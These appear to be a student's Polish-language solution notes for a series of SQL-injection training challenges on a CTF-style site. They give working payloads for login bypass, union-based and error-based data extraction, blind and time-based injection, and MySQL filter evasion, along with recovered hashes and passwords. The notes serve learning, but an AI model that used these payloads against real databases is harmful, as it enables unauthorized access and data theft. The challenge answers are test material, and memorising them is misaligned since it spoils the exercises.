# Zadanie 1

https://uw2017.p4.team/simple-sqli

```
admin' or '1' = '1
admin -d
```


# Zadanie 2

https://uw2017.p4.team/simple-sqli-2

```
a' union select 1, 'admin', '7815696ecbf1c96e6894b779456d330e' #
asd
```


# Zadanie 3

https://uw2017.p4.team/simple-sqli-2

```
a' union select 1, (select user()), '7815696ecbf1c96e6894b779456d330e' #
asd
```
Username : insertion_

```
a' union select 1, (select database()), '7815696ecbf1c96e6894b779456d330e' #
asd
```
Database: is_not_

```
a' union select 1, (SELECT SCHEMA_NAME AS `Database` FROM INFORMATION_SCHEMA.SCHEMATA
 limit 2,1), '7815696ecbf1c96e6894b779456d330e' #
asd
```
Other database: safe1


# Zadanie 4

https://uw2017.p4.team/insertion_is_not_safe1

Rejestracja:
admin                                                   cośtam
[Znane hasło]

Potem logowanie admin/[Znane hasło]


# Zadanie 5

https://uw2017.p4.team/simple-sqli

Blind SQL

md5 hasła:
3b70d46bcdca708e26c16effc4cb23ed

md5/sha1 lookup table
https://crackstation.net

hasło:
blindoracle

# Zadanie 6

https://uw2017.p4.team/blindoracle

Blind SQL z użyciem sleep

md5 hasła:
f5eb51c76706fa018cf08e7a6d7ced12

hasło:
filtration

# Zadanie 7

https://uw2017.p4.team/filtration

Mysql filtering evasion
https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/
https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/

1 or username = 'admin' #

```
//test
100/*a*/or/*a*/username=char(116,101,115,116)
//nobody
100/*a*/or/*a*/username=char(110, 111, 98, 111, 100, 121)/*a*/limit/*a*/1
//admin
100/*a*/or/*a*/username=char(97, 100, 109, 105, 110)/*a*/limit/*a*/1
// But user 'admin' doesn't exist...
```

```
1/*a*/union/*a*/sel''ect/*a*/0,1,2,3,4,5,6,7,char(97, 100, 109, 105, 110),9,10,11,12,13,14/*a*/limit/*a*/1,1
```

# Zadanie 8
Error based SQL injection

https://uw2017.p4.team/error-sqli

https://osandamalith.com/2015/07/15/error-based-sql-injection-using-exp/

```
a' union select exp(~(select*from(select user())x)),1,2,3#
a' union select exp(~(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x)),1,2,3#
```
// 4 columns in table user


# Narzędzia (raczej do pentestów)

`sqlmap`
